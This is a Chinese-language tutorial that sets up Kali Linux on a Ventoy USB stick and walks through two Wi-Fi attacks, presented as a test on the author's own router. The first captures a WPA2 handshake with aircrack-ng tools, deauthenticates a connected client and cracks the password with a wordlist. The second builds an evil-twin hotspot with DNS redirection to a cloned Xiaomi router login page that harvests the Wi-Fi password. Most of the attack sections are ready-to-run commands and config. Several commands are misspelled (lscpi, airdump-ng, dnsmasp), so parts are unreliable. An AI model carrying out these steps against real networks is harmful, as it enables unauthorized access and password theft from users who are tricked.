概述

只需几分钟便能搭建好一个完整的wifi攻击环境，针对无线破解，钓鱼诱导两种攻击方式来进行实验，此次实验使用 Ventoy 来制作 kali linux U盘启动，在使用本机自带无线网卡（WIFI 6 AX200）的情况下来完成整个实验。


Ventoy

简单来说，Ventoy是一个制作可启动U盘的开源工具，仅需要把ISO/WIM/IMG/VHD(x)/EFI等类型的文件拷贝到U盘里面就可以启动了，无需其他操作，详细说明各位可在官网看到。


官网地址

https://www.ventoy.net

下载对应使用系统版本，在这里我们下载windows版来进行安装，解压即可使用会检测出我们已经插入的U盘，第一次安装会需要格式化U盘，此后升级都不会再格式化U盘，且不影响日常U盘使用。


kali镜像下载地址：

https://www.kali.org/downloads/

安装完成后将kali镜像拖入U盘中，Ventoy支持多个系统，可多个系统一起使用。



U盘数据持久化

需要将kali的数据设置为持久化存储，不然每次重启系统都重置。


Ventoy数据持久化在官网上也给出详细说明，有更多需求的话建议详细看一下。

https://www.ventoy.net/cn/plugin_persistence.html

我们先在U盘中创建/ventoy/ventoy.json文件（默认是没有的），文件内容为：

{
    "persistence": [
        {
            "image": "/kali-linux-2021.1-live-amd64.iso",
            "backend": "/persistence/kali-linux-2021.1-live-amd64.iso.dat"
        }
    ]
}

使用官网脚本创建一个存储数据持久化镜像文件（在linux中创建）：

wget https://www.ventoy.net/download/CreatePersistentImg.sh


//创建一个2G大小的持久化镜像文件

sudo sh CreatePersistentImg.sh -s 2048 -l persistence -c persistence.conf

没有使用linux系统可在官网github下载：

https://github.com/ventoy/backend/releases

将创建好的镜像文件放在ventoy.json中配置目录下

这样我们的U盘启动就算制作完成，后续只需将电脑BIOS设置为U盘启动即可，在这里百度自己电脑BIOS设置就行。

kali wifi 驱动

可能有些电脑的网卡kali还没有支持，可先查看自己网卡信息kali是否已经支持（在这里只考虑使用本机自带网卡来测试），使用以下命令先查看网卡信息：

lscpi -vvv

查看 apt 源中是否有本机网卡驱动

apt search iwlwifi

没有找到自己网卡信息的话可以在镜像目录下找找看，或者google下网卡是否支持。


我们的网卡已经可以正常检测到附近wifi


无线网络认证
在正式开始攻击之前，我们先简单了解一下关于无线网络的一些知识，这样才能更好的了解到我们所攻击的一些原理，扩展更广阔的攻击面（仅简单说明我们此次攻击的WPA/WPA2类型认证）。


WPA2-Personal（预共用密钥模式），又称为WPA2-PSK，WPA/WPA2为混合模式，可以兼容部分老设备，在家庭和公司当中使用比较多。加密方式采用AES，而且不加密的wifi传输速度会更快。wpa在一定程度上已经算是安全的，但是还是存在一些缺陷，无法避免防碰撞，DDOS攻击，弱口令爆破，而且在最近爆出了更多的wifi设计上是缺陷，基本影响市面上大部分的wifi。详情可以访问下面地址查看（以上仅是一些说明，不是绝对正确），

https://www.fragattacks.com/


Aircrack-ng套件使用

在进入kali时屏幕亮度比较暗, 可设置/sys/class/backlight/amdgpu_bl0/brightness文件来配置，默认是20，设置为80即可

sudo vim /sys/class/backlight/amdgpu_bl0/

查看无线网卡名字：

iwconfig

开启监听：

sudo airmon-ng  start wlan0

开启监听后网卡就直接改名为wlan0mon了，关闭监听也需要使用这个网卡名。

扫描附近的wifi：

sudo airodump-ng  wlan0mon

BSSID代表路由器的 MAC 地址

PWR 代表信号的强度，数值越大代表信息越强

CH 代表信道

ENC 代表用的加密的方式

AUTH 代表认证的方式

ESSID 是WIFI的名字

STATION 是已经连接该WIFI的客户端


我们选择Crazypad5.0_2.4G这个，这个是我们自己的wifi，实际上我们这个路由器开启了2.4G频率和5G频率的wifi，但是airodump-ng仅扫描出2.4G频率的wifi，是因为airodump-ng默认是监听2.4G的wifi, 我们要破解5G的wifi的话可以使用下面的方法来监听。


使用sudo iw list 查看网卡支持的5G wifi 频率

监听 5G频率

sudo airdump-ng -C 5180-5885 wlan0 

后面对于5G频率的wifi的破解和2.4G相同


监听我们选择的wifi：

airodump-ng -w Crazypad5.0_2.4G -c 1 --bssid
50:XX:XX:XX:A3 wlan0mon
//
-c 指定信道
-w 参数指定生成的文件名
 --bssid 指定路由器的MAC地址

进入下面界面：

不要关闭当前窗口，再创建一个命令行窗口：

aireplay-ng -0 50 -a 50:46:99:3D:66:A3 -c

4C:XX:XX:XX:XX:A7 wlan0mon

//

50 是发包的数量

-a 指定路由器的MAC地址

-c 指定连接的客户端的MAC地址


执行完该命令之后可以看到我们的手机已经断开连接：

在我们尝试用手机重新连接时，airodump-ng 已经抓到了wifi的握手包：

我们可以在目录下找到Desktop-01.cap文件

到这里我们已经成功得到了wifi的握手包，后面就需要对Desktop-01.cap进行破解：

aircrack-ng -w /usr/share/wordlists/rockyou.txt

-b 50:46:99:3D:66:A3 Desktop-01.cap

//

-w指定密码字典

-b指定路由器的MAC地

经过一段时间的爆破之后，可以看到我们已经成功得到了wifi密码：

关于wifi的握手包爆破，有一款比aircrack-ng更强大的工具，hashcat下的一款工具 hcxdumptool, 关于详细说明可查看该地址：

https://hashcat.net/forum/thread-7717.html

钓鱼诱导

参考：https://blog.bbskali.cn/2179.html


我们钓鱼诱导是思路是先对客户端进行拒绝服务攻击，也就是让一个活跃的客户端与wifi断开连接，然后连接到一个我们创建的钓鱼wifi。在受害者连接到我们的wifi时，不管访问哪里站点，或是自动访问其它站点，都会通过DNS重定向到我们伪造的路由器登录页面，提示输入wifi密码信息。


我们使用airbase-ng来伪造一个wifi热点，在使用airbase-ng时也需要使用sudo airmon-ng  start wlan0 来开启网卡的监听

sudo airmon-ng  start wlan0

sudo airbase-ng wlan0mon -e "Crazypad5.0_2.4G" -c 1


或者可以使用hostapd来搭建

sudo apt install hostapd

vim hostapd.conf


// hostapd.conf 内容

interface=wlan0mon

ssid=Crazypad5.0_2.4G #无线名称

hw_mode=g

channel=6

macaddr_acl=0

ignore_broadcast_ssid=0


DHCP服务器搭建
DHCP服务器我们使用dnsmasp来搭建，这个是比较快速方便的方法（问题也多）。

vim dnsmasp.conf


// dnsmasp.conf内容

interface=wlan0mon

dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h

dhcp-option=3,192.168.1.1

dhcp-option=6,192.168.1.1

server=127.0.0.1

log-querieslog-dhcp

listen-address=127.0.0.1


DNS伪造：

将本地DNS更改指向 127.0.0.1

*.baidu.com      127.0.0.1

*.google.com    127.0.0.1

*.qq.com           127.0.0.1

*.taobao.com    127.0.0.1

*.alipay.com      127.0.0.1

伪造路由器页面：

此次我们攻击目标是小米路由器，那我们使用fofa直接找个小米路由器登录页面保存下来，稍微修改一些位置，比如这样的，只要用户输入密码我们便可以在后台看到：


无线网卡分配地址：

ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0


route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

启动钓鱼热点

hostapd hostapd.conf


启动DHCP服务

dnsmasq -C dnsmasq.conf -d

到这里整个实验便已经完成，现在只要用户访问我们伪造的路由地址，输入密码就成功了。
